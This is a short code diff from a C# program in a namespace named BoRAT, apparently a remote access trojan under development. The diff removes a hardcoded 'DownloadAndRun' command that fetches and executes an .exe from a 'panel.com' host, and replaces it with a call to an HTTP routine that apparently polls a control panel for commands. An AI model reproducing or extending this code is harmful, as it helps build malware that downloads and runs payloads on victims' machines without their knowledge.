@@ -12,16 +12,15 @@ namespace BoRAT
     {
         static void Main(string[] args)
         {
-            Work.Run("DownloadAndRun|http://panel.com/1.exe*DownloadAndRun|http://panel.com/1.exe*");
-            //while (true)
-            //{
-            //    Http.Request();
-            //    Thread.Sleep(5000);
-            //}
-
-            Console.ReadKey();
+            try
+            {
+                Http.Work();
+            }
+            catch (Exception ex)
+            {
+                Console.Write(ex.Message);
+            }
         }
-
       
     }
 }
